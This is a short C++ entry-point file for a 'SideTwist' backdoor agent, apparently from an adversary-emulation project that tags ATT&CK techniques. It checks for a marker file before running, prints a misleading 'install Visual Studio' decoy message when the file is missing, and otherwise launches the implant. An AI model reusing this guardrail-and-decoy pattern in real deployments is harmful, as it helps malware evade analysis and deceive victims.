#include "SideTwist.h"

int main(int argc, char* argv[])
{
	char* buf = nullptr;
	size_t sz = 0;
	if (_dupenv_s(&buf, &sz, "LOCALAPPDATA") == 0 && buf != nullptr)
	{
		std::string path = std::string(buf) + "\\SystemFailureReporter\\update.xml";
		free(buf);
		
		/**
		* MITRE ATT&CK Technique: T1083 - File and Directory Discovery
		*/
		if (!PathFileExistsA(path.c_str()))
		{
			OutputDebugStringW(L"Please install visual studio 2017 and try again");
			return -1;
		}
	}
	
	//Create the agent with default settings and run once
	SideTwist* sideTwistObj = new SideTwist();
	sideTwistObj->run();
	delete sideTwistObj;
	return 0;
}
